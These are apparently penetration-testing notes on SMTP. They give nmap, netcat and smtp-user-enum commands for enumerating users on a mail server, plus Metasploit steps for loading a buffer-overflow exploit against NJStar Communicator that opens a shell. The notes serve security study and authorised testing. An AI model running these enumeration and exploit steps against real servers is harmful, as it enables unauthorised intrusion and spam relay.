## SMTP

Simple Mail Transfer Protocol (SMTP)
- used to send, receive and relay emails
- uses port 25
- Attacks: user enumeration and relay to send spam or phising mails

### SMTP Enumeration

#### Nmap

```sh
nmap --script smtp* -p 25 <target-ip>    
```

#### NCat
Ncat "Manual Enumeration" can give more informations
```sh
nc -C <target-ip> 25

# The -C flag in the nc command sends CRLF as line-ending. 
# This is particularly useful when interacting with a server that expects Windows-style line endings.  
# the context of your code, 
# nc -C <target-ip> 25 is used to establish a connection to the SMTP server at the target IP address on port 25, 
# sending CRLF as line-ending.
```

#### smtp-user-enum
Also enumerates more
```sh
smtp-user-enum -M VRFY -U users.txt -t <target-ip>
```


### Exploring SMTP


#### msfconsole

This is full Metasploit Exploit which creates a shell if attackable
```sh
msfconsole
search njstar # njstar Communicator 3.0 SMTP Buffer Overflow
use 0 #use the found exploit
show options #(optional) show options just to get infos
set RHOSTS <target-ip>
```